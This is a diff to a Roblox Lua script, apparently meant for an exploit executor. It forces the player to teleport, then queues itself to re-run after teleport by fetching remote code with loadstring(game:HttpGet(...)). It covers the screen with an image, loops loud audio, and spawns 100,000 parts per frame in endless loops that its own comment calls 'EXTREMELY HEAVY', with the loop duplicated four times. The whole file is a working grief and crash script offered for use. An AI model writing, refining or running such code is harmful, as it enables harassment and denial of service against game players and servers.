@@ -12,80 +12,119 @@ local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
 -------------------------------------------------
--- TELEPORT + REQUEUE
+-- ALWAYS TELEPORT (EVEN IF SAME GAME)
 -------------------------------------------------
-if game.PlaceId ~= TARGET_PLACE_ID then
-    if queue_on_teleport then
-        queue_on_teleport(string.format([[
-            loadstring(game:HttpGet("%s"))()
-        ]], SCRIPT_URL))
-    end
-
-    TeleportService:Teleport(TARGET_PLACE_ID, LocalPlayer)
-    return
+if queue_on_teleport then
+    queue_on_teleport(string.format([[
+        loadstring(game:HttpGet("%s"))()
+    ]], SCRIPT_URL))
 end
 
+-- Force rejoin even if already in the same place
+TeleportService:Teleport(TARGET_PLACE_ID, LocalPlayer)
 
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-
--------------------------------------------------
--- FULLSCREEN GUI
--------------------------------------------------
-local gui = Instance.new("ScreenGui")
-gui.Name = "FullscreenCover"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-gui.Parent = playerGui
-
-local img = Instance.new("ImageLabel")
-img.Parent = gui
-img.BackgroundTransparency = 0.5 -- semi-transparent white background
-img.BackgroundColor3 = Color3.fromRGB(255,255,255)
-img.Size = UDim2.fromScale(1, 1)
-img.Image = IMAGE_ID
-img.ScaleType = Enum.ScaleType.Stretch
-img.ZIndex = 999999
+wait(4.5)
 
 -------------------------------------------------
--- LOOPED AUDIO
+-- GUI (NO LOAD WAIT)
 -------------------------------------------------
-local sound = Instance.new("Sound")
-sound.SoundId = SOUND_ID
-sound.Volume = 10
-sound.Looped = true
-sound.Parent = SoundService
-sound:Play()
+task.spawn(function()
+    local parentGui =
+        (LocalPlayer:FindFirstChild("PlayerGui"))
+        or game:GetService("CoreGui")
 
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "FullscreenCover"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    gui.Parent = parentGui
+
+    local img = Instance.new("ImageLabel")
+    img.Parent = gui
+    img.BackgroundTransparency = 0.5
+    img.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    img.Size = UDim2.fromScale(1, 1)
+    img.Image = IMAGE_ID
+    img.ScaleType = Enum.ScaleType.Stretch
+    img.ZIndex = 999999
+end)
+
+-------------------------------------------------
+-- AUDIO (NO LOAD WAIT)
+-------------------------------------------------
+task.spawn(function()
+    local sound = Instance.new("Sound")
+    sound.SoundId = SOUND_ID
+    sound.Volume = 10
+    sound.Looped = true
+    sound.Parent = SoundService
+    sound:Play()
+end)
+
+wait(0.00625)
+
+-------------------------------------------------
+-- INFINITE PART SPAM (EXTREMELY HEAVY)
+-------------------------------------------------
 while true do
-    for i = 1000, 999999 do -- safe batch
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local pos = hrp and hrp.Position or Vector3.new(0, 5, 0)
+
+    for i = 1, 100000 do
         local part = Instance.new("Part")
-        part.Size = Vector3.new(1,1,1)
-        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = pos
         part.Anchored = false
         part.Parent = workspace
     end
+
     RunService.Stepped:Wait()
 end
 
 while true do
-    for i = 1000, 999999 do -- safe batch
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local pos = hrp and hrp.Position or Vector3.new(0, 5, 0)
+
+    for i = 1, 100000 do
         local part = Instance.new("Part")
-        part.Size = Vector3.new(1,1,1)
-        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = pos
         part.Anchored = false
         part.Parent = workspace
     end
+
     RunService.Stepped:Wait()
 end
-
 while true do
-    for i = 1000, 999999 do -- safe batch
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local pos = hrp and hrp.Position or Vector3.new(0, 5, 0)
+
+    for i = 1, 100000 do
         local part = Instance.new("Part")
-        part.Size = Vector3.new(1,1,1)
-        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = pos
         part.Anchored = false
         part.Parent = workspace
     end
+
+    RunService.Stepped:Wait()
+end
+while true do
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local pos = hrp and hrp.Position or Vector3.new(0, 5, 0)
+
+    for i = 1, 100000 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = pos
+        part.Anchored = false
+        part.Parent = workspace
+    end
+
     RunService.Stepped:Wait()
 end
